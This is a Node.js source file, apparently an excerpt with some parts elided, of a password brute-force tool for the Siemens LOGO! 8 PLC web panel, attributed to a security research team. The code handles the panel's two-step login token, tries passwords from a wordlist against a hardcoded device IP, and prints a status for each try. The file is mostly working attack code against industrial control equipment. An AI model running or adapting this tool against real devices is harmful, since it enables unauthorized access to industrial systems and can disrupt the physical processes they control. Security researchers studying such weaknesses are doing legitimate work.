////////////////////////////////////////////////////////////////////////////////
//                SIEMENS LOGO! 8 web panel brute force                       //
//              Yossi Reuven - NEC Israel Research Center                     //
//----------------------------------------------------------------------------//
// Motivation: SIEMENS using 2-step authentication so known brute force       //
//             tools (Hydra, Medusa, ...) does not work well in this case.    //
// Requirments: Node JS, shelljs (npm install shelljs)                        //
// Usage: node LOGO_bf.js <passwords.txt>       # static username - Web User  //
////////////////////////////////////////////////////////////////////////////////
// Declarations
...
var HOST = '192.168.2.92';
var USERAGENT = 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0';
////////////////////////////////////////////////////////////////////////////////
// Login operations:
function LoginHandler(oTracer, resp) {
  var sResponseText = resp;
  var bSuccessfully = false;
  var arrResult = sResponseText.split(",");
  if (parseInt(arrResult[0]) == 700) {
      if (arrResult.length == 3) {
          m_sRef = arrResult[1];
          m_iKey2 = parseInt(arrResult[2]) >>> 0;
          bSuccessfully = true;
      }
  }
  if (bSuccessfully) {
      var sPasswordToken = oTracer.m_sPassword + "+" + m_iKey2;
...
function PasswordTry(pass){
  ...
  oLoginTracer.m_iLang = "1";
  oLoginTracer.m_bKeeySignIn = false;
  oLoginTracer.m_bLogToCustomizedSite = false;
  Login(oLoginTracer);
  found = oLoginTracer.found;
  delete oLoginTracer;
  return found;
}
////////////////////////////////////////////////////////////////////////////////
...
function StartPrint(){
  console.log('\n');
  console.log('                \x1b[46m   NEC IRC   \x1b[0m');
  console.log('                \x1b[46mSEC-TEAM 2019\x1b[0m');
  console.log('                \x1b[37mSiemens LOGO!   \x1b[0m');
  console.log('                \x1b[37m Brute-Force \x1b[0m');
  console.log('\n');
  console.log('       \x1b[37mPASSWORD            STATUS\x1b[0m', '');
...
StartPrint();
var passwords = GetPassFile(process.argv[2]);
...
for (var i = 0; i < passwordsLength-1; i++) {
  ...
  if (PasswordTry(passwords[i]) == 700) {
    ...
    console.log('       ' + passwords[i] + space_len + '\x1b[31mFail\x1b[0m');
  }
}
